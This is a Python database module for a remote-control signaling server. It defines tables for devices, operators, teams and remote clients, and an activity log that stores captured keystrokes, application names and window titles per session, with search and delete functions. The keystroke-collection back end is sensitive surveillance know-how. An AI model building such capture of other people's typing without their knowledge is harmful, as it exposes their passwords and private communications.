import asyncio
import json
import logging

import asyncpg

import signaling_config as config


logger = logging.getLogger("signaling_server")

db_pool: asyncpg.Pool | None = None

DEVICE_REGISTRY_SCHEMA = [
    """
    CREATE TABLE IF NOT EXISTS device_registry (
        device_token TEXT PRIMARY KEY,
        session_id TEXT NOT NULL,
        external_ip TEXT,
        status TEXT NOT NULL DEFAULT 'inactive',
        created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
        last_seen TIMESTAMPTZ NOT NULL DEFAULT NOW()
    );
    """,
    "ALTER TABLE device_registry ADD COLUMN IF NOT EXISTS status TEXT NOT NULL DEFAULT 'inactive';",
]

REMOTE_CONTROLLER_SCHEMA = [
    """
    CREATE TABLE IF NOT EXISTS teams (
        id TEXT PRIMARY KEY,
        name TEXT NOT NULL,
        activity BOOLEAN NOT NULL DEFAULT TRUE
    );
    """,
    """
    CREATE TABLE IF NOT EXISTS team_tags (
        id TEXT PRIMARY KEY,
        team_id TEXT REFERENCES teams(id) ON DELETE CASCADE,
        name TEXT NOT NULL,
        color TEXT NOT NULL,
        created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    );
    """,
    """
    CREATE UNIQUE INDEX IF NOT EXISTS team_tags_unique
    ON team_tags (team_id, lower(name));
    """,
    """
    CREATE TABLE IF NOT EXISTS operators (
        id TEXT PRIMARY KEY,
        name TEXT NOT NULL,
        password TEXT NOT NULL,
        role TEXT NOT NULL,
        team TEXT REFERENCES teams(id) ON DELETE SET NULL
    );
    """,
    """
    CREATE TABLE IF NOT EXISTS remote_clients (
        id TEXT PRIMARY KEY,
        name TEXT NOT NULL,
        status TEXT NOT NULL DEFAULT 'disconnected',
        connected_time INTEGER NOT NULL DEFAULT 0,
        status_changed_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
        first_connected_at TIMESTAMPTZ,
        work_status TEXT NOT NULL DEFAULT 'planning',
        assigned_operator_id TEXT,
        assigned_team_id TEXT,
        ip TEXT,
        region TEXT,
        client_config JSONB
    );
    """,
    """
    CREATE TABLE IF NOT EXISTS client_tags (
        client_id TEXT REFERENCES remote_clients(id) ON DELETE CASCADE,
        tag_id TEXT REFERENCES team_tags(id) ON DELETE CASCADE,
        PRIMARY KEY (client_id, tag_id)
    );
    """,
    """
    CREATE TABLE IF NOT EXISTS activity_logs (
        id SERIAL PRIMARY KEY,
        session_id TEXT NOT NULL,
        timestamp TIMESTAMPTZ NOT NULL DEFAULT NOW(),
        application TEXT NOT NULL,
        window_title TEXT NOT NULL,
        input_text TEXT NOT NULL,
        entry_type TEXT NOT NULL DEFAULT 'keystroke',
        created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    );
    """,
    """
    CREATE INDEX IF NOT EXISTS activity_logs_session_idx
    ON activity_logs (session_id, timestamp DESC);
    """,
    """
    CREATE INDEX IF NOT EXISTS activity_logs_created_idx
    ON activity_logs (created_at DESC);
    """,
    "ALTER TABLE remote_clients ADD COLUMN IF NOT EXISTS status_changed_at TIMESTAMPTZ NOT NULL DEFAULT NOW();",
    "ALTER TABLE remote_clients ADD COLUMN IF NOT EXISTS first_connected_at TIMESTAMPTZ;",
    "ALTER TABLE remote_clients ADD COLUMN IF NOT EXISTS work_status TEXT NOT NULL DEFAULT 'planning';",
    "ALTER TABLE remote_clients ADD COLUMN IF NOT EXISTS assigned_operator_id TEXT;",
    "ALTER TABLE remote_clients ADD COLUMN IF NOT EXISTS assigned_team_id TEXT;",
    "ALTER TABLE remote_clients ADD COLUMN IF NOT EXISTS client_config JSONB;",
]


async def init_db() -> None:
    """Initialize the asyncpg pool and schema when configured."""
    global db_pool
    if not config.DATABASE_URL:
        logger.info("Database disabled (RC_DATABASE_URL not set).")
        return
    for attempt in range(1, config.DB_CONNECT_RETRIES + 1):
        try:
            db_pool = await asyncpg.create_pool(
                config.DATABASE_URL,
                min_size=config.DB_POOL_MIN,
                max_size=config.DB_POOL_MAX,
                statement_cache_size=config.DB_STATEMENT_CACHE_SIZE,
            )
            async with db_pool.acquire() as conn:
                for statement in DEVICE_REGISTRY_SCHEMA + REMOTE_CONTROLLER_SCHEMA:
                    await conn.execute(statement)
                await conn.execute(
                    """
                    UPDATE remote_clients
                    SET first_connected_at = COALESCE(
                        first_connected_at,
                        (
                            SELECT MIN(created_at)
                            FROM device_registry
                            WHERE device_registry.session_id = remote_clients.id
                        )
                    )
                    WHERE first_connected_at IS NULL;
                    """
                )
            logger.info("Database connection established.")
            return
        except Exception:
            logger.exception("Database connection failed (attempt %s).", attempt)
            await asyncio.sleep(min(5, attempt))
    raise RuntimeError("Database connection failed after retries.")


async def close_db() -> None:
    """Close the database pool if initialized."""
    global db_pool
    if db_pool:
        await db_pool.close()
        db_pool = None


async def upsert_device(
    device_token: str,
    session_id: str,
    external_ip: str | None,
    status: str,
) -> None:
    """Insert or update a device registry record."""
    if not db_pool:
        return
    try:
        async with db_pool.acquire() as conn:
            await conn.execute(
                """
                INSERT INTO device_registry (device_token, session_id, external_ip, status)
                VALUES ($1, $2, $3, $4)
                ON CONFLICT (device_token)
                DO UPDATE SET
                    session_id = EXCLUDED.session_id,
                    external_ip = EXCLUDED.external_ip,
                    status = EXCLUDED.status,
                    last_seen = NOW();
                """,
                device_token,
                session_id,
                external_ip,
                status,
            )
    except Exception:
        logger.exception("Failed to upsert device record for token %s", device_token)


async def update_device_status(device_token: str, status: str) -> None:
    """Update device status and last_seen for an existing record."""
    if not db_pool:
        return
    try:
        async with db_pool.acquire() as conn:
            await conn.execute(
                """
                UPDATE device_registry
                SET status = $2,
                    last_seen = NOW()
                WHERE device_token = $1;
                """,
                device_token,
                status,
            )
    except Exception:
        logger.exception("Failed to update status for token %s", device_token)


async def touch_device_last_seen(device_token: str) -> None:
    """Update last_seen for an existing device record."""
    if not db_pool:
        return
    try:
        async with db_pool.acquire() as conn:
            await conn.execute(
                """
                UPDATE device_registry
                SET last_seen = NOW()
                WHERE device_token = $1;
                """,
                device_token,
            )
    except Exception:
        logger.exception("Failed to update last_seen for token %s", device_token)


async def upsert_remote_client(
    session_id: str,
    status: str,
    external_ip: str | None = None,
    assigned_team_id: str | None = None,
    assigned_operator_id: str | None = None,
    client_config: dict | None = None,
    display_name: str | None = None,
) -> None:
    """Insert or update a remote client record."""
    if not db_pool or not session_id:
        return
    config_payload = json.dumps(client_config) if client_config is not None else None
    display_name_value = display_name.strip() if isinstance(display_name, str) else None
    try:
        async with db_pool.acquire() as conn:
            await conn.execute(
                """
                INSERT INTO remote_clients (
                    id,
                    name,
                    status,
                    connected_time,
                    ip,
                    assigned_team_id,
                    assigned_operator_id,
                    status_changed_at,
                    first_connected_at,
                    client_config
                )
                VALUES (
                    $1,
                    COALESCE(NULLIF($7, ''), $1),
                    $2,
                    0,
                    $3,
                    $4,
                    $5,
                    NOW(),
                    CASE WHEN $2 = 'connected' THEN NOW() ELSE NULL END,
                    $6::jsonb
                )
                ON CONFLICT (id)
                DO UPDATE SET
                    status = EXCLUDED.status,
                    name = CASE
                        WHEN remote_clients.name IS NULL
                             OR remote_clients.name = ''
                             OR remote_clients.name = remote_clients.id
                        THEN COALESCE(NULLIF($7, ''), remote_clients.name)
                        ELSE remote_clients.name
                    END,
                    ip = COALESCE(EXCLUDED.ip, remote_clients.ip),
                    assigned_team_id = COALESCE(remote_clients.assigned_team_id, EXCLUDED.assigned_team_id),
                    assigned_operator_id = COALESCE(remote_clients.assigned_operator_id, EXCLUDED.assigned_operator_id),
                    client_config = CASE
                        WHEN EXCLUDED.client_config IS NULL THEN remote_clients.client_config
                        WHEN remote_clients.client_config IS NULL THEN EXCLUDED.client_config
                        ELSE remote_clients.client_config || EXCLUDED.client_config
                    END,
                    first_connected_at = CASE
                        WHEN remote_clients.first_connected_at IS NULL
                             AND EXCLUDED.status = 'connected' THEN NOW()
                        ELSE remote_clients.first_connected_at
                    END,
                    connected_time = CASE
                        WHEN remote_clients.status IS DISTINCT FROM EXCLUDED.status THEN 0
                        ELSE remote_clients.connected_time
                    END,
                    status_changed_at = CASE
                        WHEN remote_clients.status IS DISTINCT FROM EXCLUDED.status THEN NOW()
                        ELSE remote_clients.status_changed_at
                    END;
                """,
                session_id,
                status,
                external_ip,
                assigned_team_id,
                assigned_operator_id,
                config_payload,
                display_name_value,
            )
    except Exception:
        logger.exception("Failed to upsert remote client %s", session_id)


async def update_connected_time() -> None:
    """Persist connected time for remote clients every tick."""
    if config.CONNECTED_TIME_INTERVAL <= 0:
        return
    interval = max(1.0, config.CONNECTED_TIME_INTERVAL)
    while True:
        await asyncio.sleep(interval)
        if not db_pool:
            continue
        try:
            async with db_pool.acquire() as conn:
                await conn.execute(
                    """
                    UPDATE remote_clients
                    SET connected_time = GREATEST(
                        0,
                        EXTRACT(EPOCH FROM NOW() - status_changed_at)
                    )::int
                    WHERE status = 'connected';
                    """
                )
        except Exception:
            logger.exception("Failed to update connected time")


async def insert_activity_logs(
    session_id: str,
    entries: list[dict],
) -> int:
    """Insert activity log entries for a session.
    
    Returns number of inserted rows.
    """
    if not db_pool or not entries:
        return 0
    
    inserted = 0
    try:
        async with db_pool.acquire() as conn:
            for entry in entries:
                timestamp = entry.get("timestamp")
                application = entry.get("application", "Unknown")
                window_title = entry.get("window_title", "Unknown")
                input_text = entry.get("input_text", "")
                entry_type = entry.get("entry_type", "keystroke")
                
                if not input_text:
                    continue
                
                await conn.execute(
                    """
                    INSERT INTO activity_logs 
                    (session_id, timestamp, application, window_title, input_text, entry_type)
                    VALUES ($1, COALESCE($2::timestamptz, NOW()), $3, $4, $5, $6);
                    """,
                    session_id,
                    timestamp,
                    application,
                    window_title,
                    input_text,
                    entry_type,
                )
                inserted += 1
    except Exception:
        logger.exception("Failed to insert activity logs for session %s", session_id)
    
    return inserted


async def get_activity_logs(
    session_id: str,
    limit: int = 100,
    offset: int = 0,
    entry_type: str | None = None,
    application: str | None = None,
    search: str | None = None,
    start_date: str | None = None,
    end_date: str | None = None,
) -> list[dict]:
    """Fetch activity logs for a session with filtering.
    
    Returns list of activity log entries.
    """
    if not db_pool:
        return []
    
    try:
        async with db_pool.acquire() as conn:
            query = """
                SELECT id, session_id, timestamp, application, window_title, 
                       input_text, entry_type, created_at
                FROM activity_logs
                WHERE session_id = $1
            """
            params: list = [session_id]
            param_idx = 2
            
            if entry_type:
                query += f" AND entry_type = ${param_idx}"
                params.append(entry_type)
                param_idx += 1
            
            if application:
                query += f" AND application ILIKE ${param_idx}"
                params.append(f"%{application}%")
                param_idx += 1
            
            if search:
                query += f" AND (input_text ILIKE ${param_idx} OR window_title ILIKE ${param_idx})"
                params.append(f"%{search}%")
                param_idx += 1
            
            if start_date:
                query += f" AND timestamp >= ${param_idx}::timestamptz"
                params.append(start_date)
                param_idx += 1
            
            if end_date:
                query += f" AND timestamp <= ${param_idx}::timestamptz"
                params.append(end_date)
                param_idx += 1
            
            query += f" ORDER BY timestamp DESC LIMIT ${param_idx} OFFSET ${param_idx + 1}"
            params.extend([limit, offset])
            
            rows = await conn.fetch(query, *params)
            return [dict(row) for row in rows]
    except Exception:
        logger.exception("Failed to fetch activity logs for session %s", session_id)
        return []


async def get_activity_logs_count(
    session_id: str,
    entry_type: str | None = None,
    application: str | None = None,
    search: str | None = None,
    start_date: str | None = None,
    end_date: str | None = None,
) -> int:
    """Get count of activity logs for a session with filtering."""
    if not db_pool:
        return 0
    
    try:
        async with db_pool.acquire() as conn:
            query = "SELECT COUNT(*) FROM activity_logs WHERE session_id = $1"
            params: list = [session_id]
            param_idx = 2
            
            if entry_type:
                query += f" AND entry_type = ${param_idx}"
                params.append(entry_type)
                param_idx += 1
            
            if application:
                query += f" AND application ILIKE ${param_idx}"
                params.append(f"%{application}%")
                param_idx += 1
            
            if search:
                query += f" AND (input_text ILIKE ${param_idx} OR window_title ILIKE ${param_idx})"
                params.append(f"%{search}%")
                param_idx += 1
            
            if start_date:
                query += f" AND timestamp >= ${param_idx}::timestamptz"
                params.append(start_date)
                param_idx += 1
            
            if end_date:
                query += f" AND timestamp <= ${param_idx}::timestamptz"
                params.append(end_date)
                param_idx += 1
            
            result = await conn.fetchval(query, *params)
            return result or 0
    except Exception:
        logger.exception("Failed to count activity logs for session %s", session_id)
        return 0


async def delete_activity_logs(
    session_id: str,
    log_ids: list[int] | None = None,
) -> int:
    """Delete activity logs for a session.
    
    If log_ids is provided, only delete those specific entries.
    Otherwise delete all entries for the session.
    
    Returns number of deleted rows.
    """
    if not db_pool:
        return 0
    
    try:
        async with db_pool.acquire() as conn:
            if log_ids:
                result = await conn.execute(
                    """
                    DELETE FROM activity_logs 
                    WHERE session_id = $1 AND id = ANY($2::int[]);
                    """,
                    session_id,
                    log_ids,
                )
            else:
                result = await conn.execute(
                    "DELETE FROM activity_logs WHERE session_id = $1;",
                    session_id,
                )
            # Parse "DELETE N" response
            deleted = int(result.split()[-1]) if result else 0
            return deleted
    except Exception:
        logger.exception("Failed to delete activity logs for session %s", session_id)
        return 0


async def get_activity_applications(session_id: str) -> list[str]:
    """Get list of unique applications for a session."""
    if not db_pool:
        return []
    
    try:
        async with db_pool.acquire() as conn:
            rows = await conn.fetch(
                """
                SELECT DISTINCT application 
                FROM activity_logs 
                WHERE session_id = $1 
                ORDER BY application;
                """,
                session_id,
            )
            return [row["application"] for row in rows]
    except Exception:
        logger.exception("Failed to get applications for session %s", session_id)
        return []
